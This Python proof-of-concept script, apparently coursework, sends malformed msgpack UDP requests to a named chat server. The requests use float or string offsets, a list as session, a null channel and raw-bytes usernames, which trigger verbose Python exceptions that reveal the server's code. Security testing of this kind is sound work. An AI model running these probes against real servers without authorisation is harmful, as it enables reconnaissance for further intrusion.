"""
VULN-03: Server leaks raw Python exception messages
=====================================================
Multiple fields, when given unexpected types, cause the server to return
unhandled Python exceptions verbatim. This reveals that the server is
written in Python and exposes internal implementation details that reduce
the effort required for deeper attacks.

Each error maps to a specific code pattern in the server:

  offset = 1.5  →  "slice indices must be integers..."
                   Server does: data[offset : offset + PAGE_SIZE]

  offset = "x"  →  "can only concatenate str (not 'int') to str"
                   Server does: str_offset + integer_constant

  session = []  →  "int() argument must be a string..."
                   Server does: int(session) directly on the raw field

  channel = nil →  "object of type 'NoneType' has no len()"
                   Server does: len(channel) without a null check

  raw bytes usr →  "startswith first arg must be bytes or a tuple..."
                   Server does: username.startswith('clear-') with mixed types

Run: uv run python vulnerabilities/poc_03_error_disclosure.py
"""
import socket, msgpack, random

HOST, PORT = 'csc4026z.link', 51825

def fresh_session():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    h = random.randrange(1, 2**32)
    s.send(msgpack.packb({'request_type': 1, 'request_handle': h}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session']

def req(s, msg):
    s.send(msgpack.packb(msg))
    try:
        return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout:
        return None

def h():
    return random.randrange(1, 2**32)


def main():
    sock, session = fresh_session()
    print('Triggering raw Python exceptions from the server:\n')

    cases = [
        (
            {'request_type': 5, 'session': session, 'request_handle': h(), 'offset': 1.5},
            'CHANNEL_LIST  offset=1.5 (float)',
            'Server code:  channels[offset : offset + PAGE_SIZE]',
        ),
        (
            {'request_type': 5, 'session': session, 'request_handle': h(), 'offset': 'x'},
            'CHANNEL_LIST  offset="x" (string)',
            'Server code:  str_offset + integer_constant',
        ),
        (
            {'request_type': 3, 'session': [session], 'request_handle': h()},
            'PING          session=[list]',
            'Server code:  int(session)',
        ),
    ]
    sock.close()

    for msg, label, implication in cases:
        s, _ = fresh_session()
        r = req(s, msg)
        error = r.get(b'error', b'').decode(errors='replace') if r else '(no response)'
        s.close()
        print(f'  Input:       {label}')
        print(f'  Error:       "{error}"')
        print(f'  Reveals:     {implication}')
        print()

    # Separate: CHANNEL_CREATE channel=None
    s, session2 = fresh_session()
    r = req(s, {'request_type': 4, 'session': session2, 'request_handle': h(),
                'channel': None, 'description': 'x'})
    error = r.get(b'error', b'').decode(errors='replace') if r else ''
    s.close()
    print(f'  Input:       CHANNEL_CREATE  channel=None')
    print(f'  Error:       "{error}"')
    print(f'  Reveals:     Server code:  len(channel) without null check')
    print()

    # Separate: raw bytes username (bytes vs str confusion)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    s.send(msgpack.packb({'request_type': 1, 'request_handle': h()}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    raw_session = r[b'session']
    s.send(msgpack.packb({'request_type': 13, 'session': raw_session,
                          'request_handle': h(), 'username': b'clear-\xc0\x80'}))
    r2 = msgpack.unpackb(s.recv(4096), raw=True)
    s.close()
    error = r2.get(b'error', b'').decode(errors='replace') if r2 else ''
    print(f'  Input:       SET_USERNAME  username=b"clear-\\xc0\\x80" (raw bytes)')
    print(f'  Error:       "{error}"')
    print(f'  Reveals:     Server code:  username.startswith("clear-") — bytes/str mismatch')
    print()

    print('='*60)
    print('5 distinct Python exceptions exposed.')
    print('Confirms: Python server, list-slicing pagination, int() session cast,')
    print('len() channel validation, startswith() prefix check.')


if __name__ == '__main__':
    main()
